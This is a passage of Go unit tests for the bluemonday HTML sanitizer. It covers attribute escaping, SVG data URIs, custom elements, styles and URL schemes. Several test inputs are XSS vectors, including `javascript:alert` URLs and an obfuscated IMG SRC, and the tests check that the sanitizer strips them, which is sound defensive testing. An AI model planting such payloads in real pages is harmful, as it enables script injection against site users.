Q4Ljk2OS02MC43ODQsNDguOTY5CgkJQzQ2OS45MDEsMjA2Ljc0NCw0NDQuNTU3LDE5OC4zNzIsNDI2LjA4NywxODEuODM3eiIvPgoJPHBhdGggZmlsbD0iI0FERTBFNCIgZD0iTTU2My45ODQsMTgxLjgzN2wyMy4xOTEtMjcuNzA5YzE0LjgyNCwxMS44MTYsMzEuMzYyLDE4LjA0MSw0OC43NTUsMTguMDQxCgkJYzExLjE3NCwwLDE3LjE4OC0zLjg2NiwxNy4xODgtMTAuMzA2di0wLjQzN2MwLTYuMjI1LTQuOTQyLTkuNjY1LTI1LjM0NC0xNC4zODdjLTMyLjAwNS03LjMwMi01Ni43MDUtMTYuMzIxLTU2LjcwNS00Ny4yNXYtMC40MwoJCWMwLTI3LjkyMiwyMi4xMjMtNDguMTEzLDU4LjIwNS00OC4xMTNjMjUuNTU5LDAsNDUuNTM1LDYuODc1LDYxLjg1OSwxOS45NzNsLTIwLjgzOSwyOS40MjkKCQljLTEzLjc0LTkuNjY4LTI4Ljc3My0xNC44MTgtNDIuMDk3LTE0LjgxOGMtMTAuMDkxLDAtMTUuMDM1LDQuMjk0LTE1LjAzNSw5LjY2M3YwLjQzYzAsNi44NjksNS4xNTksOS44ODEsMjUuOTk1LDE0LjYwNgoJCWMzNC41NzksNy41MTYsNTYuMDU1LDE4LjY4Nyw1Ni4wNTUsNDYuODE5djAuNDI3YzAsMzAuNzE1LTI0LjI3LDQ4Ljk2OS02MC43ODUsNDguOTY5CgkJQzYwNy43OTgsMjA2Ljc0NCw1ODIuNDUzLDE5OC4zNzIsNTYzLjk4NCwxODEuODM3eiIvPgo8L2c+Cjwvc3ZnPgo=&#39;)"></p>`,
		},
	}

	p := UGCPolicy()
	p.AllowAttrs("style").OnElements("p")

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestIssue143(t *testing.T) {
	// HTML escaping of attribute values appears to occur twice
	tests := []test{
		{
			in:       `<p title='"'></p>`,
			expected: `<p title="&#34;"></p>`,
		},
		{
			in:       `<p title="&quot;"></p>`,
			expected: `<p title="&#34;"></p>`,
		},
		{
			in:       `<p title="&nbsp;"></p>`,
			expected: `<p title=" "></p>`,
		},
	}

	p := UGCPolicy()
	p.AllowAttrs("title").OnElements("p")

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestIssue146(t *testing.T) {
	// https://github.com/microcosm-cc/bluemonday/issues/146
	//
	// Ask for image/svg+xml to be accepted.
	// This blog https://digi.ninja/blog/svg_xss.php shows that inline images
	// that are SVG are considered safe, so I've added that and this test
	// verifies that it works.
	p := NewPolicy()
	p.AllowImages()
	p.AllowDataURIImages()

	input := `<img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4KPHN2ZyB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgCiAgICAgICAgICAgICAgICAgICB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgCiAgICAgICAgICAgICAgICAgICB2aWV3Qm94PSIwIDAgNjk2IDI1OCIgCiAgICAgICAgICAgICAgICAgICBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0Ij4KPGc+Cgk8cGF0aCBmaWxsPSIjQURFMEU0IiBkPSJNMC43ODcsNTMuODI1aDQxLjY2OXYxMTMuODM4aDcyLjgxNHYzNi41MTFIMC43ODdWNTMuODI1eiIvPgoJPHBhdGggZmlsbD0iI0FERTBFNCIgZD0iTTEzMy4xMDUsNTMuODI1aDEyMC4yNzV2MzYuNTE0aC03OC42MXYyNS41Nmg3MS4wOTN2MzQuNTgyaC03MS4wOTN2NTMuNjk0aC00MS42NjVWNTMuODI1eiIvPgoJPHBhdGggZmlsbD0iI0FERTBFNCIgZD0iTTI2Ny4xMzQsMTI5LjQyOXYtMC40MjdjMC00My44MTYsMzQuMzY0LTc4LjE4Miw4MC45NzQtNzguMTgyYzI2LjQyMSwwLDQ1LjEwNyw4LjE2MSw2MSwyMS45MDgKCQlsLTI0LjQ4NiwyOS40MjNjLTEwLjc0LTkuMDE5LTIxLjQ3OS0xNC4xNzItMzYuMjk0LTE0LjE3MmMtMjEuNjk1LDAtMzguNDUyLDE4LjI1NC0zOC40NTIsNDEuMjM5djAuNDI1CgkJYzAsMjQuMjczLDE2Ljk2Niw0MS42NzIsNDAuODA0LDQxLjY3MmMxMC4xMDMsMCwxNy44MzYtMi4xNDYsMjQuMDYzLTYuMjMxdi0xOC4yNTdoLTI5LjY0M3YtMzAuNWg2OS4xNTl2NjcuNjU5CgkJYy0xNS44OTMsMTMuMTA0LTM4LjAxNiwyMy4xOTctNjUuMjkxLDIzLjE5N0MzMDIuMTQ3LDIwNy4xODIsMjY3LjEzNCwxNzQuOTY0LDI2Ny4xMzQsMTI5LjQyOXoiLz4KCTxwYXRoIGZpbGw9IiNBREUwRTQiIGQ9Ik00MjYuMDg3LDE4MS44MzdsMjMuMTk1LTI3LjcwOWMxNC44MjIsMTEuODE2LDMxLjM2MSwxOC4wNDEsNDguNzU1LDE4LjA0MQoJCWMxMS4xNzEsMCwxNy4xODYtMy44NjYsMTcuMTg2LTEwLjMwNnYtMC40MzdjMC02LjIyNS00Ljk0LTkuNjY1LTI1LjM0Ny0xNC4zODdjLTMyLjAwNi03LjMwMi01Ni43MDItMTYuMzIxLTU2LjcwMi00Ny4yNXYtMC40MwoJCWMwLTI3LjkyMiwyMi4xMjMtNDguMTEzLDU4LjItNDguMTEzYzI1LjU2NCwwLDQ1LjU0Miw2Ljg3NSw2MS44NTgsMTkuOTczbC0yMC44MjksMjkuNDI5CgkJYy0xMy43NDctOS42NjgtMjguNzc4LTE0LjgxOC00Mi4wOTYtMTQuODE4Yy0xMC4wOTcsMC0xNS4wMzcsNC4yOTQtMTUuMDM3LDkuNjYzdjAuNDNjMCw2Ljg2OSw1LjE1NSw5Ljg4MSwyNS45OTIsMTQuNjA2CgkJYzM0LjU3OSw3LjUxNiw1Ni4wNTcsMTguNjg3LDU2LjA1Nyw0Ni44MTl2MC40MjdjMCwzMC43MTUtMjQuMjcxLDQ4Ljk2OS02MC43ODQsNDguOTY5CgkJQzQ2OS45MDEsMjA2Ljc0NCw0NDQuNTU3LDE5OC4zNzIsNDI2LjA4NywxODEuODM3eiIvPgoJPHBhdGggZmlsbD0iI0FERTBFNCIgZD0iTTU2My45ODQsMTgxLjgzN2wyMy4xOTEtMjcuNzA5YzE0LjgyNCwxMS44MTYsMzEuMzYyLDE4LjA0MSw0OC43NTUsMTguMDQxCgkJYzExLjE3NCwwLDE3LjE4OC0zLjg2NiwxNy4xODgtMTAuMzA2di0wLjQzN2MwLTYuMjI1LTQuOTQyLTkuNjY1LTI1LjM0NC0xNC4zODdjLTMyLjAwNS03LjMwMi01Ni43MDUtMTYuMzIxLTU2LjcwNS00Ny4yNXYtMC40MwoJCWMwLTI3LjkyMiwyMi4xMjMtNDguMTEzLDU4LjIwNS00OC4xMTNjMjUuNTU5LDAsNDUuNTM1LDYuODc1LDYxLjg1OSwxOS45NzNsLTIwLjgzOSwyOS40MjkKCQljLTEzLjc0LTkuNjY4LTI4Ljc3My0xNC44MTgtNDIuMDk3LTE0LjgxOGMtMTAuMDkxLDAtMTUuMDM1LDQuMjk0LTE1LjAzNSw5LjY2M3YwLjQzYzAsNi44NjksNS4xNTksOS44ODEsMjUuOTk1LDE0LjYwNgoJCWMzNC41NzksNy41MTYsNTYuMDU1LDE4LjY4Nyw1Ni4wNTUsNDYuODE5djAuNDI3YzAsMzAuNzE1LTI0LjI3LDQ4Ljk2OS02MC43ODUsNDguOTY5CgkJQzYwNy43OTgsMjA2Ljc0NCw1ODIuNDUzLDE5OC4zNzIsNTYzLjk4NCwxODEuODM3eiIvPgo8L2c+Cjwvc3ZnPgo=" alt="">`
	out := p.Sanitize(input)
	expected := `<img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4KPHN2ZyB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgCiAgICAgICAgICAgICAgICAgICB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgCiAgICAgICAgICAgICAgICAgICB2aWV3Qm94PSIwIDAgNjk2IDI1OCIgCiAgICAgICAgICAgICAgICAgICBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0Ij4KPGc+Cgk8cGF0aCBmaWxsPSIjQURFMEU0IiBkPSJNMC43ODcsNTMuODI1aDQxLjY2OXYxMTMuODM4aDcyLjgxNHYzNi41MTFIMC43ODdWNTMuODI1eiIvPgoJPHBhdGggZmlsbD0iI0FERTBFNCIgZD0iTTEzMy4xMDUsNTMuODI1aDEyMC4yNzV2MzYuNTE0aC03OC42MXYyNS41Nmg3MS4wOTN2MzQuNTgyaC03MS4wOTN2NTMuNjk0aC00MS42NjVWNTMuODI1eiIvPgoJPHBhdGggZmlsbD0iI0FERTBFNCIgZD0iTTI2Ny4xMzQsMTI5LjQyOXYtMC40MjdjMC00My44MTYsMzQuMzY0LTc4LjE4Miw4MC45NzQtNzguMTgyYzI2LjQyMSwwLDQ1LjEwNyw4LjE2MSw2MSwyMS45MDgKCQlsLTI0LjQ4NiwyOS40MjNjLTEwLjc0LTkuMDE5LTIxLjQ3OS0xNC4xNzItMzYuMjk0LTE0LjE3MmMtMjEuNjk1LDAtMzguNDUyLDE4LjI1NC0zOC40NTIsNDEuMjM5djAuNDI1CgkJYzAsMjQuMjczLDE2Ljk2Niw0MS42NzIsNDAuODA0LDQxLjY3MmMxMC4xMDMsMCwxNy44MzYtMi4xNDYsMjQuMDYzLTYuMjMxdi0xOC4yNTdoLTI5LjY0M3YtMzAuNWg2OS4xNTl2NjcuNjU5CgkJYy0xNS44OTMsMTMuMTA0LTM4LjAxNiwyMy4xOTctNjUuMjkxLDIzLjE5N0MzMDIuMTQ3LDIwNy4xODIsMjY3LjEzNCwxNzQuOTY0LDI2Ny4xMzQsMTI5LjQyOXoiLz4KCTxwYXRoIGZpbGw9IiNBREUwRTQiIGQ9Ik00MjYuMDg3LDE4MS44MzdsMjMuMTk1LTI3LjcwOWMxNC44MjIsMTEuODE2LDMxLjM2MSwxOC4wNDEsNDguNzU1LDE4LjA0MQoJCWMxMS4xNzEsMCwxNy4xODYtMy44NjYsMTcuMTg2LTEwLjMwNnYtMC40MzdjMC02LjIyNS00Ljk0LTkuNjY1LTI1LjM0Ny0xNC4zODdjLTMyLjAwNi03LjMwMi01Ni43MDItMTYuMzIxLTU2LjcwMi00Ny4yNXYtMC40MwoJCWMwLTI3LjkyMiwyMi4xMjMtNDguMTEzLDU4LjItNDguMTEzYzI1LjU2NCwwLDQ1LjU0Miw2Ljg3NSw2MS44NTgsMTkuOTczbC0yMC44MjksMjkuNDI5CgkJYy0xMy43NDctOS42NjgtMjguNzc4LTE0LjgxOC00Mi4wOTYtMTQuODE4Yy0xMC4wOTcsMC0xNS4wMzcsNC4yOTQtMTUuMDM3LDkuNjYzdjAuNDNjMCw2Ljg2OSw1LjE1NSw5Ljg4MSwyNS45OTIsMTQuNjA2CgkJYzM0LjU3OSw3LjUxNiw1Ni4wNTcsMTguNjg3LDU2LjA1Nyw0Ni44MTl2MC40MjdjMCwzMC43MTUtMjQuMjcxLDQ4Ljk2OS02MC43ODQsNDguOTY5CgkJQzQ2OS45MDEsMjA2Ljc0NCw0NDQuNTU3LDE5OC4zNzIsNDI2LjA4NywxODEuODM3eiIvPgoJPHBhdGggZmlsbD0iI0FERTBFNCIgZD0iTTU2My45ODQsMTgxLjgzN2wyMy4xOTEtMjcuNzA5YzE0LjgyNCwxMS44MTYsMzEuMzYyLDE4LjA0MSw0OC43NTUsMTguMDQxCgkJYzExLjE3NCwwLDE3LjE4OC0zLjg2NiwxNy4xODgtMTAuMzA2di0wLjQzN2MwLTYuMjI1LTQuOTQyLTkuNjY1LTI1LjM0NC0xNC4zODdjLTMyLjAwNS03LjMwMi01Ni43MDUtMTYuMzIxLTU2LjcwNS00Ny4yNXYtMC40MwoJCWMwLTI3LjkyMiwyMi4xMjMtNDguMTEzLDU4LjIwNS00OC4xMTNjMjUuNTU5LDAsNDUuNTM1LDYuODc1LDYxLjg1OSwxOS45NzNsLTIwLjgzOSwyOS40MjkKCQljLTEzLjc0LTkuNjY4LTI4Ljc3My0xNC44MTgtNDIuMDk3LTE0LjgxOGMtMTAuMDkxLDAtMTUuMDM1LDQuMjk0LTE1LjAzNSw5LjY2M3YwLjQzYzAsNi44NjksNS4xNTksOS44ODEsMjUuOTk1LDE0LjYwNgoJCWMzNC41NzksNy41MTYsNTYuMDU1LDE4LjY4Nyw1Ni4wNTUsNDYuODE5djAuNDI3YzAsMzAuNzE1LTI0LjI3LDQ4Ljk2OS02MC43ODUsNDguOTY5CgkJQzYwNy43OTgsMjA2Ljc0NCw1ODIuNDUzLDE5OC4zNzIsNTYzLjk4NCwxODEuODM3eiIvPgo8L2c+Cjwvc3ZnPgo=" alt="">`
	if out != expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			out,
			expected)
	}
}

func TestIssue147(t *testing.T) {
	// https://github.com/microcosm-cc/bluemonday/issues/147
	//
	// ```
	// p.AllowElementsMatching(regexp.MustCompile(`^custom-`))
	// p.AllowNoAttrs().Matching(regexp.MustCompile(`^custom-`))
	// ```
	// This does not work as expected. This looks like a limitation, and the
	// question is whether the matching has to be applied in a second location
	// to overcome the limitation.
	//
	// However the issue is really that the `.Matching()` returns an attribute
	// test that has to be bound to some elements, it isn't a global test.
	//
	// This should work:
	// ```
	// p.AllowNoAttrs().Matching(regexp.MustCompile(`^custom-`)).OnElementsMatching(regexp.MustCompile(`^custom-`))
	// ```
	p := NewPolicy()
	p.AllowNoAttrs().Matching(regexp.MustCompile(`^custom-`)).OnElementsMatching(regexp.MustCompile(`^custom-`))

	input := `<custom-component>example</custom-component>`
	out := p.Sanitize(input)
	expected := `<custom-component>example</custom-component>`
	if out != expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			out,
			expected)
	}
}

func TestRemovingEmptySelfClosingTag(t *testing.T) {
	p := NewPolicy()

	// Only broke when attribute policy was specified.
	p.AllowAttrs("type").OnElements("input")

	input := `<input/>`
	out := p.Sanitize(input)
	expected := ``
	if out != expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			out,
			expected)
	}
}

func TestIssue161(t *testing.T) {
	// https://github.com/microcosm-cc/bluemonday/issues/161
	//
	// ```
	// p.AllowElementsMatching(regexp.MustCompile(`^custom-`))
	// p.AllowNoAttrs().Matching(regexp.MustCompile(`^custom-`))
	// ```
	// This does not work as expected. This looks like a limitation, and the
	// question is whether the matching has to be applied in a second location
	// to overcome the limitation.
	//
	// However the issue is really that the `.Matching()` returns an attribute
	// test that has to be bound to some elements, it isn't a global test.
	//
	// This should work:
	// ```
	// p.AllowNoAttrs().Matching(regexp.MustCompile(`^custom-`)).OnElementsMatching(regexp.MustCompile(`^custom-`))
	// ```
	p := UGCPolicy()
	p.AllowElements("picture", "source")
	p.AllowAttrs("srcset", "src", "type", "media").OnElements("source")

	input := `<picture><source src="b.jpg" media="(prefers-color-scheme: dark)"></source><img src="a.jpg"></picture>`
	out := p.Sanitize(input)
	expected := input
	if out != expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			out,
			expected)
	}
}

func TestIssue171(t *testing.T) {
	// https://github.com/microcosm-cc/bluemonday/issues/171
	//
	// Trailing spaces in the style attribute should not cause the value to be omitted
	p := UGCPolicy()
	p.AllowAttrs("style").OnElements("p")
	p.AllowStyles("color", "text-align").OnElements("p")

	input := `<p style="color: red; text-align: center;   "></p>`
	out := p.Sanitize(input)
	expected := `<p style="color: red; text-align: center"></p>`
	if out != expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			out,
			expected)
	}
}

func TestIssue174(t *testing.T) {
	// https://github.com/microcosm-cc/bluemonday/issues/174
	//
	// Allow all URL schemes
	p := UGCPolicy()
	p.AllowURLSchemesMatching(regexp.MustCompile(`.+`))

	input := `<a href="cbthunderlink://somebase64string"></a>
<a href="matrix:roomid/psumPMeAfzgAeQpXMG:feneas.org?action=join"></a>
<a href="https://github.com"></a>`
	out := p.Sanitize(input)
	expected := `<a href="cbthunderlink://somebase64string" rel="nofollow"></a>
<a href="matrix:roomid/psumPMeAfzgAeQpXMG:feneas.org?action=join" rel="nofollow"></a>
<a href="https://github.com" rel="nofollow"></a>`
	if out != expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			out,
			expected)
	}

	// Custom handling of specific URL schemes even if the regex allows all
	p.AllowURLSchemeWithCustomPolicy("javascript", func(*url.URL) bool {
		return false
	})

	input = `<a href="cbthunderlink://somebase64string"></a>
<a href="javascript:alert('test')">xss</a>`
	out = p.Sanitize(input)
	expected = `<a href="cbthunderlink://somebase64string" rel="nofollow"></a>
xss`
	if out != expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			out,
			expected)
	}
}

func TestXSSGo18(t *testing.T) {
	p := UGCPolicy()

	tests := []test{
		{
			in:       `<IMG SRC="jav&#x0D;ascript:alert('XSS');">`,
			expected: ``,
		},
		{
			in:       "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
			expected: ``,
		},
	}

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestIssue208(t *testing.T) {
	// https://github.com/microcosm-cc/bluemonday/issues/208

	p := NewPolicy()
	p.AllowElements("span")
	p.AllowAttrs("title").Matching(Paragraph).Globally()
	p.AllowAttrs("title").Matching(regexp.MustCompile(`.*`)).Globally()

	input := `<span title="a">b</span>`
	out := p.Sanitize(input)
	expected := `<span title="a">b</span>`
	if out != expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			out,
			expected)
	}
}
